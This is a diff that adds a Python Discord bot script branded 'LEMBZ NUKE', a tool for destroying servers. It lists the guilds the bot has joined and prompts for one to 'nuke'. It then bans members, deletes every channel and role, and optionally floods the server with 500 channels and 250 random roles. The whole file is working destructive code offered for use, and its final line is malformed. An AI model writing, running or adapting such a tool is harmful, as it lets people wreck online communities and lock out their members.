@@ -1,0 +1,221 @@
+colorama.init()
+
+bot = commands.Bot(command_prefix="!", intents = discord.Intents.all())
+
+
+@bot.event
+async def on_ready():
+    print(f"Logged in as {bot.user}")
+
+    print(Fore.RED + '''
+$\       $$$$$$$$\ $$\      $$\ $$$$$$$\  $$$$$$$$\       $$\   $$\ $$\   $$\ $$\   $$\ $$$$$$$$\ 
+$$ |      $$  _____|$$$\    $$$ |$$  __$$\ \____$$  |      $$$\  $$ |$$ |  $$ |$$ | $$  |$$  _____|
+$$ |      $$ |      $$$$\  $$$$ |$$ |  $$ |    $$  /       $$$$\ $$ |$$ |  $$ |$$ |$$  / $$ |      
+$$ |      $$$$$\    $$\$$\$$ $$ |$$$$$$$\ |   $$  /        $$ $$\$$ |$$ |  $$ |$$$$$  /  $$$$$\    
+$$ |      $$  __|   $$ \$$$  $$ |$$  __$$\   $$  /         $$ \$$$$ |$$ |  $$ |$$  $$<   $$  __|   
+$$ |      $$ |      $$ |\$  /$$ |$$ |  $$ | $$  /          $$ |\$$$ |$$ |  $$ |$$ |\$$\  $$ |      
+$$$$$$$$\ $$$$$$$$\ $$ | \_/ $$ |$$$$$$$  |$$$$$$$$\       $$ | \$$ |\$$$$$$  |$$ | \$$\ $$$$$$$$\ 
+\________|\________|\__|     \__|\_______/ \________|      \__|  \__| \______/ \__|  \__|\________|''')
+    
+    print(f'\n\n{Fore.RED}Logged in as {bot.user}\n\n')
+
+    guild_dict = {}
+    guild_name_list = [g.name for g in bot.guilds]
+    guild_index = []
+    guild_id_list = [str(g.id) for g in bot.guilds]
+    members_list = [str(len(g.members)) for g in bot.guilds]
+    guild_data = []
+    
+    
+
+
+
+
+    for indx, guild in enumerate(bot.guilds, 1):
+        guild_dict.update({int(indx): guild.id})
+        guild_index.append(str(indx))
+    
+    print(f'{Fore.CYAN}Index'.ljust(55) + f'{Fore.CYAN}Server name'.ljust(55) + f'{Fore.CYAN}Members'.ljust(55) + f'{Fore.CYAN}Server ID'.ljust(55))
+    print('-----'.ljust(50) + '-----------'.ljust(50) + '-------'.ljust(50) + '---------'.ljust(50))
+
+    
+
+    #print(print(' '.join(y.ljust(50) for y in header)))
+
+    for i in range(len(guild_index)):
+        guild_data.append([guild_index[i], guild_name_list[i], members_list[i], guild_id_list[i]])
+    
+    
+    for g in guild_data:
+        print(''.join(x.ljust(50) for x in g))
+
+    
+    
+    
+    while True:  
+        server_input = input(f'\n\n{Fore.RED}Input the Index of the server you wish to nuke: ')
+
+
+        try:
+            if int(server_input) in list(guild_dict.keys()):
+                nuke_id = guild_dict[int(server_input)]
+                guild = bot.get_guild(nuke_id)
+                nuke_members = len([m for m in guild.members if not m.bot])
+                nuke_bots = len(guild.members) - nuke_members
+                roles_bellow_bot = [role for role in guild.roles if role.position < guild.me.top_role.position and role.name != '@everyone']
+                #print(roles_bellow_bot)
+                nukable_members = 0
+                for r in roles_bellow_bot:
+                    nukable_members = nukable_members + len(r.members)
+                nuke_channels = len(guild.channels)
+                
+        
+                        
+                print(f'\n\n\n-------------------\n\n{Fore.RED}{guild.name}\n\nMembercount: {len(guild.members)}\n\nHumans: {nuke_members}\n\nBots: {nuke_bots}\n\n{Fore.BLUE}Number of members bannable: {nukable_members}\n\nNumber of channels to delete: {nuke_channels}\n\n{Fore.RED}-------------------')
+
+                nuke_confirmation = (input(f'\n\n\n{Fore.BLUE}Type {Fore.RED}NUKE {Fore.BLUE}to nuke the server, anything else will end the programme: '))
+
+                #NUKE in place
+
+                
+                
+               
+                if nuke_confirmation == ('NUKE'):
+                    print(f'\n\n{Fore.RED}NUKE CONFIRMED, nuking server...')
+                    
+                    with tqdm(total=100, leave=True) as pbar:
+                    
+                        for member in guild.members:
+                            pbar.update((1/len(guild.members)) * 80)
+                            try:
+                                if nukable_members != 0:
+                                    await member.ban()
+                                
+                            except:
+                                pass
+                        
+                        if nuke_channels != 0:
+                            for channel in guild.channels:
+                                pbar.update((1/nuke_channels) * 10)                               
+                                try:
+                                    await channel.delete()
+                                                                   
+                                except:
+                                    pass
+                            
+                            if len(guild.roles) != 0:
+
+                                for role in guild.roles:
+                                    pbar.update((1/len(guild.roles) * 10))
+
+                                    try:
+                                        await role.delete()
+                                                               
+                                    except:
+                                        pass
+                            
+                            else:
+                                pbar.update(10)
+                                           
+                        else:
+                            pbar.update(10)
+                            if len(guild.roles) != 0:
+                                for role in guild.roles:
+                                    pbar.update((1/len(guild.roles)) * 10)
+                                    try:
+                                        await role.delete()                                  
+                            
+                                    except:
+                                        pass
+                            
+                            else:
+                                pbar.update(10)
+                          
+                    print(f'\n\n{Fore.RED}All members banned.')
+                    print(f'{Fore.RED}All channels deleted.')
+                    print(f'All roles bellow bot role deleted.')
+                        
+                    
+                
+                
+                if nuke_confirmation == ('NUKE'):
+                    
+                    create_channels_confirm = input(f'\n\n{Fore.RED}Would you like to create 500 channels and 250 roles(y/n): ')
+
+                    if create_channels_confirm == 'y':
+
+                        channel_name = input(f'\n{Fore.RED}Input channel name: ')
+                        print(f'\n\nCreating 500 channels, 250 roles and securing total destruction in {guild.name}...')
+                        #bar = tqdm(total=100)
+                                                    
+                        for i in tqdm(range(500 - len(guild.channels)), position=0, leave=True, desc='Creating Channels'):
+                            await guild.create_text_channel(f'{channel_name}')
+
+                        print(f'{Fore.RED}500 text channels created')                              
+                            #bar.update((1/(500-len(guild.channels))) * 75)
+
+                        for i in tqdm(range(250 - len(guild.roles)), position=0, leave=True, desc='Creating Roles'):
+                            ran = random.randint(1000, 9999999999999)
+                            let = random.choice(string.ascii_letters)
+                            await guild.create_role(name=f'{ran}{let}')
+                        
+                        print(f'{Fore.RED}250 roles created\n\nServer is 100% destroyed.')
+
+                    else:
+                        print(f'\n\n{Fore.RED} Nuke system closing.. Have a nice day!')
+                            #bar.update((1/len(guild.roles) * 75))
+                            
+
+
+
+
+            break
+        
+        except ValueError:
+            lol = input('Invalid input please try again. Continue? (y/n): ')
+            if lol == 'y':
+                pass
+            else:
+                print('Nuke system closing, have a nice day..')
+                break
+            
+
+            
+
+            
+
+
+
+            
+        
+
+
+
+        
+    
+
+
+    
+ 
+
+    
+                        
+                    
+
+
+                    
+
+                    
+
+            
+
+
+
+
+
+
+
+
+
+
+bot.run'')
